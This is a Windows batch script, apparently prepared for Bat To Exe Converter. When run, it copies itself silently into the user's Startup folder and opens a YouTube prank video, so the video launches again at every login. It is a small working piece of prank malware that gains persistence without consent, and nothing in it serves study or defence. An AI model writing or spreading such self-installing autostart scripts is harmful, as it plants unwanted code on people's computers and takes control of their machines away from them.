::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCuDJGyX8VAjFD9bWwqOM2q+FYku4evw0+2Vo0sUV/EDcYzU1PqHI+9z
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSTk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpSI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJhZks0
::ZQ05rAF9IBncCkqN+0xwdVsFAlTi
::ZQ05rAF9IAHYFVzEqQICIRhfLA==
::eg0/rx1wNQPfEVWB+kM9LVsJDDaLP2D6NLoQ5Ig=
::fBEirQZwNQPfEVWB+kM9LVsJDDSQM2G/BaFc2uH45Io=
::cRolqwZ3JBvQF1fEqQIEIBJHDC2RfFmzBb58
::dhA7uBVwLU+EWFSK0EcmO3s=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATEphJieFtZQiCHKnja
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCuDJGyX8VAjFD9bWwqOM2q+FYku4evw0/mEsEQNQN4pKbPJ07eFbuUL7yU=
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off


if exist "%userprofile%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/%~n0%~x0" (
start "" https://www.youtube.com/watch?v=dQw4w9WgXcQ
exit

) else (
copy /y %~f0 "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
start "" https://www.youtube.com/watch?v=dQw4w9WgXcQ
exit
)